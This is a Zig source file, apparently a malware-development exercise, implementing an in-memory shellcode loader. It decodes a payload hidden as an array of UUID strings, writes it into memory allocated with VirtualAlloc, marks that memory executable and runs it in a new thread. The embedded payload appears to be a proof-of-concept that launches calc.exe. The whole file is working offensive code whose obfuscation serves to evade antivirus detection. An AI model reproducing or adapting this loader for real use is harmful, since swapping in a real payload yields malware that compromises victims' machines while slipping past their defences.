const std = @import("std");
const win = std.os.windows;
const uuidDeobfuscation = @import("payload-obfuscation-uuidfuscation.zig").uuidDeobfuscation;

const WINAPI = win.WINAPI;
const BOOL = win.BOOL;
const HANDLE = win.HANDLE;

const VIRTUAL_ALLOCATION_TYPE = packed struct(u32) {
    _0: u1 = 0,
    _1: u1 = 0,
    _2: u1 = 0,
    _3: u1 = 0,
    _4: u1 = 0,
    _5: u1 = 0,
    _6: u1 = 0,
    _7: u1 = 0,
    _8: u1 = 0,
    _9: u1 = 0,
    _10: u1 = 0,
    _11: u1 = 0,
    COMMIT: u1 = 0,
    RESERVE: u1 = 0,
    REPLACE_PLACEHOLDER: u1 = 0,
    _15: u1 = 0,
    FREE: u1 = 0,
    _17: u1 = 0,
    RESERVE_PLACEHOLDER: u1 = 0,
    RESET: u1 = 0,
    _20: u1 = 0,
    _21: u1 = 0,
    _22: u1 = 0,
    _23: u1 = 0,
    RESET_UNDO: u1 = 0,
    _25: u1 = 0,
    _26: u1 = 0,
    _27: u1 = 0,
    _28: u1 = 0,
    LARGE_PAGES: u1 = 0,
    _30: u1 = 0,
    _31: u1 = 0,
};

const PAGE_PROTECTION_FLAGS = packed struct(u32) {
    PAGE_NOACCESS: u1 = 0,
    PAGE_READONLY: u1 = 0,
    PAGE_READWRITE: u1 = 0,
    PAGE_WRITECOPY: u1 = 0,
    PAGE_EXECUTE: u1 = 0,
    PAGE_EXECUTE_READ: u1 = 0,
    PAGE_EXECUTE_READWRITE: u1 = 0,
    PAGE_EXECUTE_WRITECOPY: u1 = 0,
    PAGE_GUARD: u1 = 0,
    PAGE_NOCACHE: u1 = 0,
    PAGE_WRITECOMBINE: u1 = 0,
    PAGE_GRAPHICS_NOACCESS: u1 = 0,
    PAGE_GRAPHICS_READONLY: u1 = 0,
    PAGE_GRAPHICS_READWRITE: u1 = 0,
    PAGE_GRAPHICS_EXECUTE: u1 = 0,
    PAGE_GRAPHICS_EXECUTE_READ: u1 = 0,
    PAGE_GRAPHICS_EXECUTE_READWRITE: u1 = 0,
    PAGE_GRAPHICS_COHERENT: u1 = 0,
    PAGE_GRAPHICS_NOCACHE: u1 = 0,
    SEC_64K_PAGES: u1 = 0,
    _20: u1 = 0,
    _21: u1 = 0,
    _22: u1 = 0,
    SEC_FILE: u1 = 0,
    SEC_IMAGE: u1 = 0,
    SEC_PROTECTED_IMAGE: u1 = 0,
    SEC_RESERVE: u1 = 0,
    SEC_COMMIT: u1 = 0,
    PAGE_ENCLAVE_MASK: u1 = 0,
    PAGE_ENCLAVE_UNVALIDATED: u1 = 0,
    PAGE_TARGETS_NO_UPDATE: u1 = 0,
    PAGE_ENCLAVE_THREAD_CONTROL: u1 = 0,
};

extern "kernel32" fn VirtualAlloc(
    lpAddress: ?*anyopaque,
    dwSize: usize,
    flAllocationType: VIRTUAL_ALLOCATION_TYPE,
    flProtect: PAGE_PROTECTION_FLAGS,
) callconv(WINAPI) ?*anyopaque;

extern "kernel32" fn VirtualProtect(
    lpAddress: ?*anyopaque,
    dwSize: usize,
    flNewProtect: PAGE_PROTECTION_FLAGS,
    lpflOldProtect: ?*PAGE_PROTECTION_FLAGS,
) callconv(WINAPI) BOOL;

const SECURITY_ATTRIBUTES = extern struct {
    nLength: u32,
    lpSecurityDescriptor: ?*anyopaque,
    bInheritHandle: BOOL,
};

const LPTHREAD_START_ROUTINE = *const fn (
    lpThreadParameter: ?*anyopaque,
) callconv(WINAPI) u32;

const THREAD_CREATION_FLAGS = packed struct(u32) {
    _0: u1 = 0,
    _1: u1 = 0,
    THREAD_CREATE_SUSPENDED: u1 = 0,
    _3: u1 = 0,
    _4: u1 = 0,
    _5: u1 = 0,
    _6: u1 = 0,
    _7: u1 = 0,
    _8: u1 = 0,
    _9: u1 = 0,
    _10: u1 = 0,
    _11: u1 = 0,
    _12: u1 = 0,
    _13: u1 = 0,
    _14: u1 = 0,
    _15: u1 = 0,
    STACK_SIZE_PARAM_IS_A_RESERVATION: u1 = 0,
    _17: u1 = 0,
    _18: u1 = 0,
    _19: u1 = 0,
    _20: u1 = 0,
    _21: u1 = 0,
    _22: u1 = 0,
    _23: u1 = 0,
    _24: u1 = 0,
    _25: u1 = 0,
    _26: u1 = 0,
    _27: u1 = 0,
    _28: u1 = 0,
    _29: u1 = 0,
    _30: u1 = 0,
    _31: u1 = 0,
};

extern "kernel32" fn CreateThread(
    lpThreadAttributes: ?*SECURITY_ATTRIBUTES,
    dwStackSize: usize,
    lpStartAddress: ?LPTHREAD_START_ROUTINE,
    lpParameter: ?*anyopaque,
    dwCreationFlags: THREAD_CREATION_FLAGS,
    lpThreadId: ?*u32,
) callconv(WINAPI) ?HANDLE;

extern "kernel32" fn WaitForSingleObject(
    hHandle: ?HANDLE,
    dwMilliseconds: u32,
) callconv(WINAPI) u32;

pub const VIRTUAL_FREE_TYPE = enum(u32) {
    DECOMMIT = 16384,
    RELEASE = 32768,
};

extern "kernel32" fn VirtualFree(
    lpAddress: ?*anyopaque,
    dwSize: usize,
    dwFreeType: VIRTUAL_FREE_TYPE,
) callconv(WINAPI) BOOL;

const uuid_array = [_][:0]const u8{
    "E48348FC-E8F0-00C0-0000-415141505251",
    "D2314856-4865-528B-6048-8B5218488B52",
    "728B4820-4850-B70F-4A4A-4D31C94831C0",
    "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED",
    "48514152-528B-8B20-423C-4801D08B8088",
    "48000000-C085-6774-4801-D0508B481844",
    "4920408B-D001-56E3-48FF-C9418B348848",
    "314DD601-48C9-C031-AC41-C1C90D4101C1",
    "F175E038-034C-244C-0845-39D175D85844",
    "4924408B-D001-4166-8B0C-48448B401C49",
    "8B41D001-8804-0148-D041-5841585E595A",
    "59415841-5A41-8348-EC20-4152FFE05841",
    "8B485A59-E912-FF57-FFFF-5D48BA010000",
    "00000000-4800-8D8D-0101-000041BA318B",
    "D5FF876F-F0BB-A2B5-5641-BAA695BD9DFF",
    "C48348D5-3C28-7C06-0A80-FBE07505BB47",
    "6A6F7213-5900-8941-DAFF-D563616C632E",
    "00657865-0000-0000-0000-000000000000",
};

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    std.debug.print("[i] Injecting Shellcode To The Local Process Of Pid: {d}\n", .{win.GetCurrentProcessId()});

    std.debug.print("[i] Decrypting ...\n", .{});

    const payload = try uuidDeobfuscation(allocator, &uuid_array);
    defer allocator.free(payload);

    std.debug.print("[+] Done !\n", .{});
    std.debug.print("[i] Deobfuscated Payload At: {*} Of Size: {d}\n", .{ payload, payload.len });

    std.debug.print("[i] Allocating Memory With VirtualAlloc\n", .{});

    const shellcode = VirtualAlloc(null, payload.len, .{ .COMMIT = 1, .RESERVE = 1 }, .{ .PAGE_READWRITE = 1 });
    if (shellcode == null) {
        std.debug.print("[!] VirtualAlloc Failed With Error: {s}\n", .{@tagName(win.kernel32.GetLastError())});
        return error.VirtualAllocFailed;
    }
    defer _ = VirtualFree(shellcode.?, 0, .RELEASE);
    std.debug.print("[i] Allocated Memory At: {*}\n", .{shellcode.?});

    @memcpy(@as([*]u8, @ptrCast(shellcode.?)), payload);
    @memset(payload, 0);

    std.debug.print("[i] Modifying Memory Protection To EXECUTE_READWRITE ...\n", .{});

    var old_protection: PAGE_PROTECTION_FLAGS = undefined;

    if (VirtualProtect(
        shellcode.?,
        payload.len,
        .{ .PAGE_EXECUTE_READWRITE = 1 },
        &old_protection,
    ) != 1) {
        std.debug.print("[!] VirtualProtect Failed With Error: {s}\n", .{@tagName(win.kernel32.GetLastError())});
        return error.VirtualProtectFailed;
    }

    const shellcode_fn: *const fn (lpThreadParameter: ?*anyopaque) callconv(WINAPI) u32 = @ptrCast(shellcode.?);

    std.debug.print("[i] Creating A New Thread ...\n", .{});

    const h_thread = CreateThread(
        null,
        0,
        shellcode_fn,
        null,
        .{},
        null,
    );
    _ = WaitForSingleObject(h_thread, 2000);
}
